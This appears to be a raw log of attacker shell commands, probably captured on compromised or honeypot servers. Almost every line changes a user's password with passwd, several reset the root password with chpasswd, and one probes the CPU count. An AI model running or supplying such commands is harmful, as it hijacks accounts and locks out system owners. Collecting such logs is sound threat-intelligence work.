+echo "mysql@123\nyfAaTnkedWP6\nyfAaTnkedWP6\n"|passwd
+echo "1234\n6o0KdUxBcviq\n6o0KdUxBcviq\n"|passwd
+echo "fms\n6TwPaswlKAqL\n6TwPaswlKAqL\n"|passwd
+echo "bounce\nMF5IS7UWwxgt\nMF5IS7UWwxgt\n"|passwd
+echo "huyhq\nEznKPKxLpB2z\nEznKPKxLpB2z\n"|passwd
+echo -e "simon123\nQj5NhjGdTgxz\nQj5NhjGdTgxz"|passwd|bash
+echo -e "presto\ndv7cUGfHRmEh\ndv7cUGfHRmEh"|passwd|bash
+echo -e "goally\n6nPAX6KXukGr\n6nPAX6KXukGr"|passwd|bash
+echo -e "123456\nwjv7oyHn4tVe\nwjv7oyHn4tVe"|passwd|bash
+echo -e "mysql@123\nvLpNCE6g1On4\nvLpNCE6g1On4"|passwd|bash
+echo "simon123\nQj5NhjGdTgxz\nQj5NhjGdTgxz\n"|passwd
+echo "presto\ndv7cUGfHRmEh\ndv7cUGfHRmEh\n"|passwd
+echo -e "wirat\nTYUZSnMuWVfH\nTYUZSnMuWVfH"|passwd|bash
+echo -e "michaelwilson\njFieyYncUAFT\njFieyYncUAFT"|passwd|bash
+echo -e "concretyourdev\n9rihE0GXtcwF\n9rihE0GXtcwF"|passwd|bash
+echo -e "corvette\n9rihE0GXtcwF\n9rihE0GXtcwF"|passwd|bash
+echo -e "123456\n9rihE0GXtcwF\n9rihE0GXtcwF"|passwd|bash
+echo -e "labochemengui\n9rihE0GXtcwF\n9rihE0GXtcwF"|passwd|bash
+echo -e "test123\nvLpNCE6g1On4\nvLpNCE6g1On4"|passwd|bash
+echo "goally\n6nPAX6KXukGr\n6nPAX6KXukGr\n"|passwd
+echo -e "marcob\n9rihE0GXtcwF\n9rihE0GXtcwF"|passwd|bash
+echo -e "123\nWEYJItcfd3YU\nWEYJItcfd3YU"|passwd|bash
+echo -e "labochemengui\nWEYJItcfd3YU\nWEYJItcfd3YU"|passwd|bash
+echo -e "estudioremoto\n113MQsbvsbrW\n113MQsbvsbrW"|passwd|bash
+echo -e "123456\n113MQsbvsbrW\n113MQsbvsbrW"|passwd|bash
+echo "123456\nwjv7oyHn4tVe\nwjv7oyHn4tVe\n"|passwd
+echo -e "nuwanthi\nfvAhHI5VPeDC\nfvAhHI5VPeDC"|passwd|bash
+echo "mysql@123\nvLpNCE6g1On4\nvLpNCE6g1On4\n"|passwd
+echo -e "bodega\neZFW6t2D49rV\neZFW6t2D49rV"|passwd|bash
+echo -e "webhost\nle7t6O24Q65e\nle7t6O24Q65e"|passwd|bash
+echo -e "chavosh\nfvAhHI5VPeDC\nfvAhHI5VPeDC"|passwd|bash
+echo -e "Lalo\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps"|passwd|bash
+echo -e "2222\nx30BY4Iq0f9k\nx30BY4Iq0f9k"|passwd|bash
+echo -e "chavosh\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps"|passwd|bash
+echo -e "P@ssword\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps"|passwd|bash
+echo "wirat\nTYUZSnMuWVfH\nTYUZSnMuWVfH\n"|passwd
+echo "michaelwilson\njFieyYncUAFT\njFieyYncUAFT\n"|passwd
+echo "concretyourdev\n9rihE0GXtcwF\n9rihE0GXtcwF\n"|passwd
+echo "corvette\n9rihE0GXtcwF\n9rihE0GXtcwF\n"|passwd
+echo "123456\n9rihE0GXtcwF\n9rihE0GXtcwF\n"|passwd
+echo "labochemengui\n9rihE0GXtcwF\n9rihE0GXtcwF\n"|passwd
+echo "test123\nvLpNCE6g1On4\nvLpNCE6g1On4\n"|passwd
+echo -e "concretyourdev\nTxL4i2RiTTdk\nTxL4i2RiTTdk"|passwd|bash
+echo -e "123456\nXuJwtT7gVVdf\nXuJwtT7gVVdf"|passwd|bash
+echo -e "mikem\n8861KfaseUgC\n8861KfaseUgC"|passwd|bash
+echo "root:8861KfaseUgC"|chpasswd|bash
+echo "marcob\n9rihE0GXtcwF\n9rihE0GXtcwF\n"|passwd
+echo "123\nWEYJItcfd3YU\nWEYJItcfd3YU\n"|passwd
+echo "labochemengui\nWEYJItcfd3YU\nWEYJItcfd3YU\n"|passwd
+echo "estudioremoto\n113MQsbvsbrW\n113MQsbvsbrW\n"|passwd
+echo "123456\n113MQsbvsbrW\n113MQsbvsbrW\n"|passwd
+echo -e "123456\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps"|passwd|bash
+echo "nuwanthi\nfvAhHI5VPeDC\nfvAhHI5VPeDC\n"|passwd
+echo -e "pepe123\nF302RzAyCQuA\nF302RzAyCQuA"|passwd|bash
+echo -e "articon\nncWABIkj7T6O\nncWABIkj7T6O"|passwd|bash
+echo "bodega\neZFW6t2D49rV\neZFW6t2D49rV\n"|passwd
+echo "webhost\nle7t6O24Q65e\nle7t6O24Q65e\n"|passwd
+echo "chavosh\nfvAhHI5VPeDC\nfvAhHI5VPeDC\n"|passwd
+echo "Lalo\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps\n"|passwd
+echo "2222\nx30BY4Iq0f9k\nx30BY4Iq0f9k\n"|passwd
+echo "chavosh\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps\n"|passwd
+echo "P@ssword\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps\n"|passwd
+echo "concretyourdev\nTxL4i2RiTTdk\nTxL4i2RiTTdk\n"|passwd
+echo "123456\nXuJwtT7gVVdf\nXuJwtT7gVVdf\n"|passwd
+echo "mikem\n8861KfaseUgC\n8861KfaseUgC\n"|passwd
+echo "123456\nvEg1Sf6ZA1ps\nvEg1Sf6ZA1ps\n"|passwd
+echo "pepe123\nF302RzAyCQuA\nF302RzAyCQuA\n"|passwd
+echo "articon\nncWABIkj7T6O\nncWABIkj7T6O\n"|passwd
+echo -e "Lalo\nJxugaJMhVGUN\nJxugaJMhVGUN"|passwd|bash
+echo "root:JxugaJMhVGUN"|chpasswd|bash
+echo -e "123456\nE7NI8MPVUqvn\nE7NI8MPVUqvn"|passwd|bash
+echo "Lalo\nJxugaJMhVGUN\nJxugaJMhVGUN\n"|passwd
+echo -e "123\nX25A98KARSwj\nX25A98KARSwj"|passwd|bash
+echo -e "123456\ntomS27HZ0Bzb\ntomS27HZ0Bzb"|passwd|bash
+echo -e "Lalo\nXC5F2nDS6rhO\nXC5F2nDS6rhO"|passwd|bash
+echo -e "123456789\nXC5F2nDS6rhO\nXC5F2nDS6rhO"|passwd|bash
+echo "123456\nE7NI8MPVUqvn\nE7NI8MPVUqvn\n"|passwd
+echo -e "bywifi\nwSvm6JUVTnqx\nwSvm6JUVTnqx"|passwd|bash
+echo "123\nX25A98KARSwj\nX25A98KARSwj\n"|passwd
+echo "123456\ntomS27HZ0Bzb\ntomS27HZ0Bzb\n"|passwd
+echo -e "adna\nD6GeiWVnKwIm\nD6GeiWVnKwIm"|passwd|bash
+echo "Lalo\nXC5F2nDS6rhO\nXC5F2nDS6rhO\n"|passwd
+echo "123456789\nXC5F2nDS6rhO\nXC5F2nDS6rhO\n"|passwd
+echo -e "123456\nxSO2sHSCRlJ5\nxSO2sHSCRlJ5"|passwd|bash
+echo -e "123456789\nravpqAKYHc0e\nravpqAKYHc0e"|passwd|bash
+echo -e "temp1\nxSO2sHSCRlJ5\nxSO2sHSCRlJ5"|passwd|bash
+echo -e "123456789\nK8JlZalkSGyH\nK8JlZalkSGyH"|passwd|bash
+echo -e "tmpftp\nK8JlZalkSGyH\nK8JlZalkSGyH"|passwd|bash
+echo -e "123456\nypk7VissIYFG\nypk7VissIYFG"|passwd|bash
+echo -e "P@ssw0rd123\nK8JlZalkSGyH\nK8JlZalkSGyH"|passwd|bash
+echo -e "tomcat2\nK8JlZalkSGyH\nK8JlZalkSGyH"|passwd|bash
+echo -e "centos\ncvdOrwY1qMHF\ncvdOrwY1qMHF"|passwd|bash
+echo -e "adna\nIZ3SevbRrN2w\nIZ3SevbRrN2w"|passwd|bash
+echo "bywifi\nwSvm6JUVTnqx\nwSvm6JUVTnqx\n"|passwd
+echo "adna\nD6GeiWVnKwIm\nD6GeiWVnKwIm\n"|passwd
+echo "123456\nxSO2sHSCRlJ5\nxSO2sHSCRlJ5\n"|passwd
+echo "123456789\nravpqAKYHc0e\nravpqAKYHc0e\n"|passwd
+echo "temp1\nxSO2sHSCRlJ5\nxSO2sHSCRlJ5\n"|passwd
+echo -e "Lalo\ne5vPE9J3wgn8\ne5vPE9J3wgn8"|passwd|bash
+echo "123456789\nK8JlZalkSGyH\nK8JlZalkSGyH\n"|passwd
+echo -e "reu\n2ADfb37Vrm9S\n2ADfb37Vrm9S"|passwd|bash
+echo -e "reu\nAquiUSFxlQ6C\nAquiUSFxlQ6C"|passwd|bash
+echo -e "andreas\nelfXQejTVxLB\nelfXQejTVxLB"|passwd|bash
+echo "123456\nypk7VissIYFG\nypk7VissIYFG\n"|passwd
+echo "tmpftp\nK8JlZalkSGyH\nK8JlZalkSGyH\n"|passwd
+echo "P@ssw0rd123\nK8JlZalkSGyH\nK8JlZalkSGyH\n"|passwd
+echo "tomcat2\nK8JlZalkSGyH\nK8JlZalkSGyH\n"|passwd
+echo "centos\ncvdOrwY1qMHF\ncvdOrwY1qMHF\n"|passwd
+echo -e "srvback\nqGNN755HVnI7\nqGNN755HVnI7"|passwd|bash
+echo -e "reu\nQhbtcZWXzeTn\nQhbtcZWXzeTn"|passwd|bash
+echo -e "reu\nelfXQejTVxLB\nelfXQejTVxLB"|passwd|bash
+echo "adna\nIZ3SevbRrN2w\nIZ3SevbRrN2w\n"|passwd
+echo "Lalo\ne5vPE9J3wgn8\ne5vPE9J3wgn8\n"|passwd
+echo "reu\n2ADfb37Vrm9S\n2ADfb37Vrm9S\n"|passwd
+echo "andreas\nelfXQejTVxLB\nelfXQejTVxLB\n"|passwd
+echo "reu\nAquiUSFxlQ6C\nAquiUSFxlQ6C\n"|passwd
+echo "srvback\nqGNN755HVnI7\nqGNN755HVnI7\n"|passwd
+echo "reu\nQhbtcZWXzeTn\nQhbtcZWXzeTn\n"|passwd
+echo "reu\nelfXQejTVxLB\nelfXQejTVxLB\n"|passwd
+echo -e "123\n7ekArBas5R1N\n7ekArBas5R1N"|passwd|bash
+echo -e "qa\noCBAFLQWanxk\noCBAFLQWanxk"|passwd|bash
+echo -e "report\noCBAFLQWanxk\noCBAFLQWanxk"|passwd|bash
+echo -e "039715582364317\noCBAFLQWanxk\noCBAFLQWanxk"|passwd|bash
+echo "root:JLmuu4Lp5RK0"|chpasswd|bash
+echo -e "doule\noCBAFLQWanxk\noCBAFLQWanxk"|passwd|bash
+echo -e "matlab\noCBAFLQWanxk\noCBAFLQWanxk"|passwd|bash
+echo "123\n7ekArBas5R1N\n7ekArBas5R1N\n"|passwd
+echo -e "12345\nJbQTIuaIVYUR\nJbQTIuaIVYUR"|passwd|bash
+echo -e "roy123\nJbQTIuaIVYUR\nJbQTIuaIVYUR"|passwd|bash
+echo -e "p@ssword\nJbQTIuaIVYUR\nJbQTIuaIVYUR"|passwd|bash
+echo "root:KxBmxTmUCRed"|chpasswd|bash
+echo -e "concretyourdev\nKxBmxTmUCRed\nKxBmxTmUCRed"|passwd|bash
+echo -e "gerencia\nKxBmxTmUCRed\nKxBmxTmUCRed"|passwd|bash
+echo "qa\noCBAFLQWanxk\noCBAFLQWanxk\n"|passwd
+echo "root:F9OaDpoSmTP3"|chpasswd|bash
+echo -e "mercaderista\niJF6HoadxOrJ\niJF6HoadxOrJ"|passwd|bash
+echo -e "mercaderista\nJbFn7GDbnRys\nJbFn7GDbnRys"|passwd|bash
+echo "report\noCBAFLQWanxk\noCBAFLQWanxk\n"|passwd
+echo "039715582364317\noCBAFLQWanxk\noCBAFLQWanxk\n"|passwd
+echo "doule\noCBAFLQWanxk\noCBAFLQWanxk\n"|passwd
+echo "matlab\noCBAFLQWanxk\noCBAFLQWanxk\n"|passwd
+echo -e "user15\nnQmR3G2HC9QS\nnQmR3G2HC9QS"|passwd|bash
+echo -e "123456\nnQmR3G2HC9QS\nnQmR3G2HC9QS"|passwd|bash
+echo -e "reu\nnQmR3G2HC9QS\nnQmR3G2HC9QS"|passwd|bash
+echo -e "P@ssw0rd\nnQmR3G2HC9QS\nnQmR3G2HC9QS"|passwd|bash
+echo -e "mysql@123\nSBoDG57Ug5DN\nSBoDG57Ug5DN"|passwd|bash
+echo -e "guest54321\nnQmR3G2HC9QS\nnQmR3G2HC9QS"|passwd|bash
+echo -e "concretyourdev\nOe1ysR67H3YU\nOe1ysR67H3YU"|passwd|bash
+echo -e "xing\nJbFn7GDbnRys\nJbFn7GDbnRys"|passwd|bash
+echo -e "123456\nJbFn7GDbnRys\nJbFn7GDbnRys"|passwd|bash
+echo "12345\nJbQTIuaIVYUR\nJbQTIuaIVYUR\n"|passwd
+echo "roy123\nJbQTIuaIVYUR\nJbQTIuaIVYUR\n"|passwd
+echo "p@ssword\nJbQTIuaIVYUR\nJbQTIuaIVYUR\n"|passwd
+echo "concretyourdev\nKxBmxTmUCRed\nKxBmxTmUCRed\n"|passwd
+echo "gerencia\nKxBmxTmUCRed\nKxBmxTmUCRed\n"|passwd
+echo -e "PASS\nLVaOtqPDEQWI\nLVaOtqPDEQWI"|passwd|bash
+echo "mercaderista\niJF6HoadxOrJ\niJF6HoadxOrJ\n"|passwd
+echo "mercaderista\nJbFn7GDbnRys\nJbFn7GDbnRys\n"|passwd
+echo -e "iakovidis\nFu6UTRbL3MDR\nFu6UTRbL3MDR"|passwd|bash
+echo -e "doule\nUAJQR7zNYLui\nUAJQR7zNYLui"|passwd|bash
+echo -e "fabi\nY3tkIvFEum7Q\nY3tkIvFEum7Q"|passwd|bash
+echo -e "fabi\n6Fia2fMTBuAN\n6Fia2fMTBuAN"|passwd|bash
+echo -e "presto\nLVaOtqPDEQWI\nLVaOtqPDEQWI"|passwd|bash
+echo -e "presto\njfs0T3WseZsl\njfs0T3WseZsl"|passwd|bash
+echo -e "marcob\niSpd8zxvdGsv\niSpd8zxvdGsv"|passwd|bash
+echo -e "marcob\n6Fia2fMTBuAN\n6Fia2fMTBuAN"|passwd|bash
+echo -e "iakovidis\n6Fia2fMTBuAN\n6Fia2fMTBuAN"|passwd|bash
+echo -e "doule\njfs0T3WseZsl\njfs0T3WseZsl"|passwd|bash
+echo "user15\nnQmR3G2HC9QS\nnQmR3G2HC9QS\n"|passwd
+echo "123456\nnQmR3G2HC9QS\nnQmR3G2HC9QS\n"|passwd
+echo "reu\nnQmR3G2HC9QS\nnQmR3G2HC9QS\n"|passwd
+echo "P@ssw0rd\nnQmR3G2HC9QS\nnQmR3G2HC9QS\n"|passwd
+echo "mysql@123\nSBoDG57Ug5DN\nSBoDG57Ug5DN\n"|passwd
+echo "guest54321\nnQmR3G2HC9QS\nnQmR3G2HC9QS\n"|passwd
+echo "concretyourdev\nOe1ysR67H3YU\nOe1ysR67H3YU\n"|passwd
+echo "PASS\nLVaOtqPDEQWI\nLVaOtqPDEQWI\n"|passwd
+echo "xing\nJbFn7GDbnRys\nJbFn7GDbnRys\n"|passwd
+echo "123456\nJbFn7GDbnRys\nJbFn7GDbnRys\n"|passwd
+echo "iakovidis\nFu6UTRbL3MDR\nFu6UTRbL3MDR\n"|passwd
+echo "doule\nUAJQR7zNYLui\nUAJQR7zNYLui\n"|passwd
+echo "fabi\nY3tkIvFEum7Q\nY3tkIvFEum7Q\n"|passwd
+echo "fabi\n6Fia2fMTBuAN\n6Fia2fMTBuAN\n"|passwd
+echo -e "fabi\ndyBiFX50mmCj\ndyBiFX50mmCj"|passwd|bash
+echo -e "michaelwilson\ndyBiFX50mmCj\ndyBiFX50mmCj"|passwd|bash
+echo "presto\nLVaOtqPDEQWI\nLVaOtqPDEQWI\n"|passwd
+echo "doule\njfs0T3WseZsl\njfs0T3WseZsl\n"|passwd
+echo "presto\njfs0T3WseZsl\njfs0T3WseZsl\n"|passwd
+echo "marcob\niSpd8zxvdGsv\niSpd8zxvdGsv\n"|passwd
+echo "marcob\n6Fia2fMTBuAN\n6Fia2fMTBuAN\n"|passwd
+echo "iakovidis\n6Fia2fMTBuAN\n6Fia2fMTBuAN\n"|passwd
+echo "fabi\ndyBiFX50mmCj\ndyBiFX50mmCj\n"|passwd
+echo "michaelwilson\ndyBiFX50mmCj\ndyBiFX50mmCj\n"|passwd
+echo -e "123456\nfBGqgMJgkPAj\nfBGqgMJgkPAj"|passwd|bash
+echo -e "Majestickmaje\nfBGqgMJgkPAj\nfBGqgMJgkPAj"|passwd|bash
+echo "123456\nfBGqgMJgkPAj\nfBGqgMJgkPAj\n"|passwd
+echo -e "123456\nN47pXBnxW0ut\nN47pXBnxW0ut"|passwd|bash
+echo -e "bodega\nzQ6On24Ev4N6\nzQ6On24Ev4N6"|passwd|bash
+echo -e "doule\nzQ6On24Ev4N6\nzQ6On24Ev4N6"|passwd|bash
+echo "Majestickmaje\nfBGqgMJgkPAj\nfBGqgMJgkPAj\n"|passwd
+cat /proc/cpuinfo | grep name | wc -l | head -c 30
+echo -e "fabi\nhkZVXRxKlJT1\nhkZVXRxKlJT1"|passwd|bash
+echo -e "nuwanthi\nzQ6On24Ev4N6\nzQ6On24Ev4N6"|passwd|bash
+echo "123456\nN47pXBnxW0ut\nN47pXBnxW0ut\n"|passwd
+echo "bodega\nzQ6On24Ev4N6\nzQ6On24Ev4N6\n"|passwd
+echo "doule\nzQ6On24Ev4N6\nzQ6On24Ev4N6\n"|passwd
+echo -e "password\nUwonXilJcm0B\nUwonXilJcm0B"|passwd|bash
+echo -e "nuwanthi\nItamOZH477pD\nItamOZH477pD"|passwd|bash
+echo -e "123456\n0awveqm4FXCY\n0awveqm4FXCY"|passwd|bash
+echo "fabi\nhkZVXRxKlJT1\nhkZVXRxKlJT1\n"|passwd
+echo -e "bodega\n0awveqm4FXCY\n0awveqm4FXCY"|passwd|bash
+echo "password\nUwonXilJcm0B\nUwonXilJcm0B\n"|passwd
+echo -e "Majestickmaje\nX6PvT0um8RZ2\nX6PvT0um8RZ2"|passwd|bash
+echo -e "adept\n173nFz05uE4j\n173nFz05uE4j"|passwd|bash
+echo -e "doule\nX6PvT0um8RZ2\nX6PvT0um8RZ2"|passwd|bash
+echo -e "123456\nX6PvT0um8RZ2\nX6PvT0um8RZ2"|passwd|bash
+echo -e "qingpeng\n3XwHLBsyX0iM\n3XwHLBsyX0iM"|passwd|bash
+echo -e "xing\nyGzoHmE7eLUA\nyGzoHmE7eLUA"|passwd|bash
+echo "nuwanthi\nzQ6On24Ev4N6\nzQ6On24Ev4N6\n"|passwd
+echo "123456\n0awveqm4FXCY\n0awveqm4FXCY\n"|passwd
+echo "nuwanthi\nItamOZH477pD\nItamOZH477pD\n"|passwd
+echo -e "reports\nOe1ysR67H3YU\nOe1ysR67H3YU"|passwd|bash
+echo -e "jobsilense\nWXQGGe5AAj9a\nWXQGGe5AAj9a"|passwd|bash
+echo -e "adept\nWXQGGe5AAj9a\nWXQGGe5AAj9a"|passwd|bash
+echo "Majestickmaje\nX6PvT0um8RZ2\nX6PvT0um8RZ2\n"|passwd
+echo "adept\n173nFz05uE4j\n173nFz05uE4j\n"|passwd
+echo "doule\nX6PvT0um8RZ2\nX6PvT0um8RZ2\n"|passwd
+echo "123456\nX6PvT0um8RZ2\nX6PvT0um8RZ2\n"|passwd
+echo "qingpeng\n3XwHLBsyX0iM\n3XwHLBsyX0iM\n"|passwd
+echo -e "jobsilense\nS3XmniiN8df4\nS3XmniiN8df4"|passwd|bash
+echo -e "labochemengui\nS3XmniiN8df4\nS3XmniiN8df4"|passwd|bash
+echo "bodega\n0awveqm4FXCY\n0awveqm4FXCY\n"|passwd
+echo -e "bodega\nWXQGGe5AAj9a\nWXQGGe5AAj9a"|passwd|bash
+echo "xing\nyGzoHmE7eLUA\nyGzoHmE7eLUA\n"|passwd
+echo -e "adept\nS3XmniiN8df4\nS3XmniiN8df4"|passwd|bash
+echo -e "qwe123..\nv4RzE20MNZTI\nv4RzE20MNZTI"|passwd|bash
+echo "jobsilense\nWXQGGe5AAj9a\nWXQGGe5AAj9a\n"|passwd
+echo "adept\nWXQGGe5AAj9a\nWXQGGe5AAj9a\n"|passwd
+echo "reports\nOe1ysR67H3YU\nOe1ysR67H3YU\n"|passwd
+echo "jobsilense\nS3XmniiN8df4\nS3XmniiN8df4\n"|passwd
+echo "labochemengui\nS3XmniiN8df4\nS3XmniiN8df4\n"|passwd
+echo "adept\nS3XmniiN8df4\nS3XmniiN8df4\n"|passwd
+echo "qwe123..\nv4RzE20MNZTI\nv4RzE20MNZTI\n"|passwd
+echo -e "xing\nwW7s3udDjle9\nwW7s3udDjle9"|passwd|bash
+echo "bodega\nWXQGGe5AAj9a\nWXQGGe5AAj9a\n"|passwd
+echo -e "labochemengui\nwW7s3udDjle9\nwW7s3udDjle9"|passwd|bash
+echo "xing\nwW7s3udDjle9\nwW7s3udDjle9\n"|passwd
+echo "labochemengui\nwW7s3udDjle9\nwW7s3udDjle9\n"|passwd
+echo -e "P@ssw0rd\nOHQpjkPzwhVb\nOHQpjkPzwhVb"|passwd|bash
+echo "P@ssw0rd\nOHQpjkPzwhVb\nOHQpjkPzwhVb\n"|passwd
+echo -e "iwan\n4b20Wrtw4C6f\n4b20Wrtw4C6f"|passwd|bash
+echo -e "adept\nOpUGMtwxRmmh\nOpUGMtwxRmmh"|passwd|bash
+echo "iwan\n4b20Wrtw4C6f\n4b20Wrtw4C6f\n"|passwd
+echo -e "viktor\nlEqvzwIfPcbp\nlEqvzwIfPcbp"|passwd|bash
+echo -e "node\nlEqvzwIfPcbp\nlEqvzwIfPcbp"|passwd|bash
+echo -e "xing\nVDhW9AkAZq2z\nVDhW9AkAZq2z"|passwd|bash
+echo "adept\nOpUGMtwxRmmh\nOpUGMtwxRmmh\n"|passwd
+echo -e "qingpeng\nVDhW9AkAZq2z\nVDhW9AkAZq2z"|passwd|bash
+echo -e "coupon\n51rYUxHapPIo\n51rYUxHapPIo"|passwd|bash
+echo -e "tpering\nv1WBUQBr5jsR\nv1WBUQBr5jsR"|passwd|bash
+echo -e "jobsilense\nv1WBUQBr5jsR\nv1WBUQBr5jsR"|passwd|bash
+echo "viktor\nlEqvzwIfPcbp\nlEqvzwIfPcbp\n"|passwd
+echo "xing\nVDhW9AkAZq2z\nVDhW9AkAZq2z\n"|passwd
+echo "node\nlEqvzwIfPcbp\nlEqvzwIfPcbp\n"|passwd
+echo "qingpeng\nVDhW9AkAZq2z\nVDhW9AkAZq2z\n"|passwd
+echo "tpering\nv1WBUQBr5jsR\nv1WBUQBr5jsR\n"|passwd
+echo "jobsilense\nv1WBUQBr5jsR\nv1WBUQBr5jsR\n"|passwd
+echo -e "123456\n3BsPuu7YWnkt\n3BsPuu7YWnkt"|passwd|bash
+echo "coupon\n51rYUxHapPIo\n51rYUxHapPIo\n"|passwd
+echo -e "pers\nnBMKEYqoRPlL\nnBMKEYqoRPlL"|passwd|bash
+echo -e "wangyifa\nnBMKEYqoRPlL\nnBMKEYqoRPlL"|passwd|bash
+echo -e "adna\n64uAKAL9JPda\n64uAKAL9JPda"|passwd|bash
+echo -e "tsserver\npmwNxDMl4SZZ\npmwNxDMl4SZZ"|passwd|bash
+echo -e "<Any\n4ALnQZIbuNlQ\n4ALnQZIbuNlQ"|passwd|bash
+echo "123456\n3BsPuu7YWnkt\n3BsPuu7YWnkt\n"|passwd
+echo -e "wangyifa\nXLneZzc0V59u\nXLneZzc0V59u"|passwd|bash
+echo -e "mysql123\nXLneZzc0V59u\nXLneZzc0V59u"|passwd|bash
+echo -e "abc123\nZys0q89BuHu7\nZys0q89BuHu7"|passwd|bash
+echo -e "encargados\nkFOol2tTCDmv\nkFOol2tTCDmv"|passwd|bash
+echo -e "adna\nZys0q89BuHu7\nZys0q89BuHu7"|passwd|bash
+echo -e "iakovidis\nZys0q89BuHu7\nZys0q89BuHu7"|passwd|bash
+echo "pers\nnBMKEYqoRPlL\nnBMKEYqoRPlL\n"|passwd
+echo "wangyifa\nnBMKEYqoRPlL\nnBMKEYqoRPlL\n"|passwd
+echo "adna\n64uAKAL9JPda\n64uAKAL9JPda\n"|passwd
+echo "tsserver\npmwNxDMl4SZZ\npmwNxDMl4SZZ\n"|passwd
+echo "<Any\n4ALnQZIbuNlQ\n4ALnQZIbuNlQ\n"|passwd
+echo -e "encargados\nHTIejRNwo6hC\nHTIejRNwo6hC"|passwd|bash
+echo -e "1234\nHTIejRNwo6hC\nHTIejRNwo6hC"|passwd|bash
+echo -e "doule\nkFOol2tTCDmv\nkFOol2tTCDmv"|passwd|bash
+echo -e "mysql123\nZys0q89BuHu7\nZys0q89BuHu7"|passwd|bash
+echo -e "1234\nXfP0uaPubGi3\nXfP0uaPubGi3"|passwd|bash
+echo "wangyifa\nXLneZzc0V59u\nXLneZzc0V59u\n"|passwd
+echo "mysql123\nXLneZzc0V59u\nXLneZzc0V59u\n"|passwd
+echo -e "xing\nI3h05NENlqrK\nI3h05NENlqrK"|passwd|bash
+echo -e "viktor\nI3h05NENlqrK\nI3h05NENlqrK"|passwd|bash
+echo -e "renatav\nI3h05NENlqrK\nI3h05NENlqrK"|passwd|bash
+echo "abc123\nZys0q89BuHu7\nZys0q89BuHu7\n"|passwd
+echo -e "kruwaraporn\nI3h05NENlqrK\nI3h05NENlqrK"|passwd|bash
+echo "encargados\nkFOol2tTCDmv\nkFOol2tTCDmv\n"|passwd
+echo "adna\nZys0q89BuHu7\nZys0q89BuHu7\n"|passwd
+echo "iakovidis\nZys0q89BuHu7\nZys0q89BuHu7\n"|passwd
+echo -e "profe\nvwet840McUW2\nvwet840McUW2"|passwd|bash
+echo "encargados\nHTIejRNwo6hC\nHTIejRNwo6hC\n"|passwd
+echo "1234\nHTIejRNwo6hC\nHTIejRNwo6hC\n"|passwd
+echo "doule\nkFOol2tTCDmv\nkFOol2tTCDmv\n"|passwd
+echo -e "sergio123\nn4RpfpeQxDMF\nn4RpfpeQxDMF"|passwd|bash
+echo "mysql123\nZys0q89BuHu7\nZys0q89BuHu7\n"|passwd
+echo "viktor\nI3h05NENlqrK\nI3h05NENlqrK\n"|passwd
+echo "xing\nI3h05NENlqrK\nI3h05NENlqrK\n"|passwd
+echo "renatav\nI3h05NENlqrK\nI3h05NENlqrK\n"|passwd
+echo "1234\nXfP0uaPubGi3\nXfP0uaPubGi3\n"|passwd
+echo "kruwaraporn\nI3h05NENlqrK\nI3h05NENlqrK\n"|passwd
+echo "sergio123\nn4RpfpeQxDMF\nn4RpfpeQxDMF\n"|passwd
+echo "profe\nvwet840McUW2\nvwet840McUW2\n"|passwd
+echo -e "franco\nptEiDPk0XEi7\nptEiDPk0XEi7"|passwd|bash
+echo -e "goally\nptEiDPk0XEi7\nptEiDPk0XEi7"|passwd|bash
+echo -e "jobsilense\nptEiDPk0XEi7\nptEiDPk0XEi7"|passwd|bash
+echo -e "jobsilense\n5Mcwbnhnwuqe\n5Mcwbnhnwuqe"|passwd|bash
+echo "franco\nptEiDPk0XEi7\nptEiDPk0XEi7\n"|passwd
+echo "goally\nptEiDPk0XEi7\nptEiDPk0XEi7\n"|passwd
+echo "jobsilense\nptEiDPk0XEi7\nptEiDPk0XEi7\n"|passwd
+echo -e "bodega\nd4NwWxiR6oJb\nd4NwWxiR6oJb"|passwd|bash
+echo "jobsilense\n5Mcwbnhnwuqe\n5Mcwbnhnwuqe\n"|passwd
+echo "bodega\nd4NwWxiR6oJb\nd4NwWxiR6oJb\n"|passwd
+echo -e "1234\nxODWHPnUUnbq\nxODWHPnUUnbq"|passwd|bash
+echo -e "save\nxODWHPnUUnbq\nxODWHPnUUnbq"|passwd|bash
+echo -e "tmpftp\noENSNDS6Fd9M\noENSNDS6Fd9M"|passwd|bash
+echo -e "tanw\n1XLqFXPfdTWx\n1XLqFXPfdTWx"|passwd|bash
+echo -e "goally\najgcqAk3SPbE\najgcqAk3SPbE"|passwd|bash
+echo -e "reklame\ndKy4Terz2MdQ\ndKy4Terz2MdQ"|passwd|bash
+echo -e "reklame\n344BVfIxh8gI\n344BVfIxh8gI"|passwd|bash
+echo -e "123456\nammAdJRtqSM2\nammAdJRtqSM2"|passwd|bash
+echo "1234\nxODWHPnUUnbq\nxODWHPnUUnbq\n"|passwd
+echo "save\nxODWHPnUUnbq\nxODWHPnUUnbq\n"|passwd
+echo "tmpftp\noENSNDS6Fd9M\noENSNDS6Fd9M\n"|passwd
+echo "tanw\n1XLqFXPfdTWx\n1XLqFXPfdTWx\n"|passwd
+echo "goally\najgcqAk3SPbE\najgcqAk3SPbE\n"|passwd
+echo -e "franco\n344BVfIxh8gI\n344BVfIxh8gI"|passwd|bash
+echo -e "myblog12345\noIawu4dIpeDM\noIawu4dIpeDM"|passwd|bash
+echo -e "wangyifa\n344BVfIxh8gI\n344BVfIxh8gI"|passwd|bash
+echo "reklame\ndKy4Terz2MdQ\ndKy4Terz2MdQ\n"|passwd
+echo "reklame\n344BVfIxh8gI\n344BVfIxh8gI\n"|passwd
+echo -e "1234567\n344BVfIxh8gI\n344BVfIxh8gI"|passwd|bash
+echo -e "testing\nsKUZ5u6NfQd5\nsKUZ5u6NfQd5"|passwd|bash
+echo -e "bodega\n344BVfIxh8gI\n344BVfIxh8gI"|passwd|bash
+echo -e "bsnl\n6AYdz5AmGXxx\n6AYdz5AmGXxx"|passwd|bash
+echo -e "reklame\n5xW680MGrugX\n5xW680MGrugX"|passwd|bash
+echo -e "live\nM5GoXafDND5j\nM5GoXafDND5j"|passwd|bash
+echo "123456\nammAdJRtqSM2\nammAdJRtqSM2\n"|passwd
+echo -e "mercaderista\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
